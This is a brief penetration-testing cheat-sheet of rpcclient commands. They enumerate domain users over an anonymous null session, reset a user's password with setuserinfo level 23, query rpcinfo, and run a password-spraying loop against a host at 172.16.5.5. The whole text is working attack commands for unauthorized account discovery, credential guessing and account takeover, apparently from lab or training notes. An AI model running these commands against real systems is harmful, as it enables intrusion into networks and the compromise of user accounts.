Enumerate users: `rpcclient -N -U "" $IP -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";`
- No pass and no user

Change users password: `setuserinfo $username 23 '$password'`
- "23" refers to level of user information being modifying, and 23 is for passwords.  It doesn't change, unless you're trying to modify something else. 

`rpcinfo $IP`

Passwordspray:
`for u in $(cat valid_users.txt);do rpcclient -U "$u%$password" -c "getusername;quit" 172.16.5.5 | grep Authority; done`
